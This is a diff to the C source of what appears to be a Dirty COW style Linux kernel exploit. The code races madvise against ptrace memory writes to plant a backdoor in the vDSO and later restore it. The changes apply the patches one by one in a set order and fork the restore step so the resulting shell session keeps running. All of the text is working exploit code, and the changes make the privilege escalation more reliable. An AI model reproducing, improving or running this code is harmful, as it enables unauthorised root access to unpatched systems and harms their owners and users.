@@ -55,6 +55,7 @@ struct mem_arg  {
 	void *vdso_addr;
 	bool do_patch;
 	bool stop;
+	unsigned int patch_number;
 };
 
 static char child_stack[8192];
@@ -272,32 +273,20 @@ static int build_vdso_patch(void *vdso_addr)
 	return 0;
 }
 
-static int backdoor_vdso(pid_t pid)
+static int backdoor_vdso(pid_t pid, unsigned int patch_number)
 {
 	struct vdso_patch *p;
-	int i;
 
-	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
-		p = &vdso_patch[i];
-		if (ptrace_memcpy(pid, p->addr, p->patch, p->size) == -1)
-			return -1;
-	}
-
-	return 0;
+	p = &vdso_patch[patch_number];
+	return ptrace_memcpy(pid, p->addr, p->patch, p->size);
 }
 
-static int restore_vdso(pid_t pid)
+static int restore_vdso(pid_t pid, unsigned int patch_number)
 {
 	struct vdso_patch *p;
-	int i;
 
-	for (i = ARRAY_SIZE(vdso_patch) - 1; i >= 0; i--) {
-		p = &vdso_patch[i];
-		if (ptrace_memcpy(pid, p->addr, p->copy, p->size) == -1)
-			return -1;
-	}
-
-	return 0;
+	p = &vdso_patch[patch_number];
+	return ptrace_memcpy(pid, p->addr, p->copy, p->size);
 }
 
 /*
@@ -307,23 +296,15 @@ static int restore_vdso(pid_t pid)
 static int check(struct mem_arg *arg, int pipe)
 {
 	struct vdso_patch *p;
-	bool patched;
 	void *src;
-	int i, j;
 	char c;
+	int i;
+
+	p = &vdso_patch[arg->patch_number];
+	src = arg->do_patch ? p->patch : p->copy;
 
 	for (i = 0; i < LOOP; i++) {
-		patched = true;
-		for (j = 0; j < ARRAY_SIZE(vdso_patch); j++) {
-			p = &vdso_patch[j];
-			src = arg->do_patch ? p->patch : p->copy;
-			if (memcmp(p->addr, src, p->size) != 0) {
-				patched = false;
-				break;
-			}
-		}
-
-		if (patched) {
+		if (memcmp(p->addr, src, p->size) == 0) {
 			c = '!';
 			if (writeall(pipe, &c, sizeof(c)) == -1)
 				return -1;
@@ -340,8 +321,6 @@ static void *madviseThread(void *arg_)
 {
 	struct mem_arg *arg;
 
-	fprintf(stderr, "[*] starting madvise thread\n");
-
 	arg = (struct mem_arg *)arg_;
 	while (!arg->stop) {
 		if (madvise(arg->vdso_addr, VDSO_SIZE, MADV_DONTNEED) == -1) {
@@ -349,8 +328,6 @@ static void *madviseThread(void *arg_)
 			break;
 		}
 	}
-
-	fprintf(stderr, "[*] stopping madvise thread\n");
 
 	return NULL;
 }
@@ -407,9 +384,9 @@ static void *ptrace_thread(void *arg_)
 	ret = NULL;
 	while (!arg->stop) {
 		if (arg->do_patch)
-			ret2 = backdoor_vdso(pid);
+			ret2 = backdoor_vdso(pid, arg->patch_number);
 		else
-			ret2 = restore_vdso(pid);
+			ret2 = restore_vdso(pid, arg->patch_number);
 
 		if (ret2 == -1) {
 			ret = NULL;
@@ -429,7 +406,7 @@ static void *ptrace_thread(void *arg_)
 	return ret;
 }
 
-static int exploit(struct mem_arg *arg, bool do_patch)
+static int exploit_helper(struct mem_arg *arg)
 {
 	pthread_t pth1, pth2;
 	pid_t pid;
@@ -437,8 +414,10 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 	int ret;
 	char c;
 
-	arg->stop = false;
-	arg->do_patch = do_patch;
+	fprintf(stderr, "[*] %s: patch %d/%ld\n",
+		arg->do_patch ? "exploit" : "restore",
+		arg->patch_number + 1,
+		ARRAY_SIZE(vdso_patch));
 
 	if (pipe(fd) == -1) {
 		warn("pipe");
@@ -461,6 +440,7 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 
 	close(fd[1]);
 
+	arg->stop = false;
 	pthread_create(&pth1, NULL, madviseThread, arg);
 	pthread_create(&pth2, NULL, ptrace_thread, arg);
 
@@ -487,6 +467,36 @@ static int exploit(struct mem_arg *arg, bool do_patch)
 	}
 
 	close(fd[0]);
+
+	return ret;
+}
+
+/*
+ * Apply vDSO patches in the correct order.
+ *
+ * During the backdoor step, the payload must be written before hijacking the
+ * function prologue. During the restore step, the prologue must be restored
+ * before removing the payload.
+ */
+static int exploit(struct mem_arg *arg, bool do_patch)
+{
+	unsigned int i;
+	int ret;
+
+	ret = 0;
+	arg->do_patch = do_patch;
+
+	for (i = 0; i < ARRAY_SIZE(vdso_patch); i++) {
+		if (do_patch)
+			arg->patch_number = i;
+		else
+			arg->patch_number = ARRAY_SIZE(vdso_patch) - i - 1;
+
+		if (exploit_helper(arg) == -1) {
+			ret = -1;
+			break;
+		}
+	}
 
 	return ret;
 }
@@ -551,12 +561,13 @@ static int yeah(struct mem_arg *arg, int s)
 
 	close(s);
 
-	fprintf(stderr, "[+] ok\n");
-
-	if (exploit(arg, false) == -1)
-		fprintf(stderr, "failed to restore vDSO\n");
-
 	fprintf(stderr, "[*] enjoy!\n");
+
+	if (fork() == 0) {
+		if (exploit(arg, false) == -1)
+			fprintf(stderr, "[-] failed to restore vDSO\n");
+		exit(0);
+	}
 
 	fds[0].fd = STDIN_FILENO;
 	fds[0].events = POLLIN;
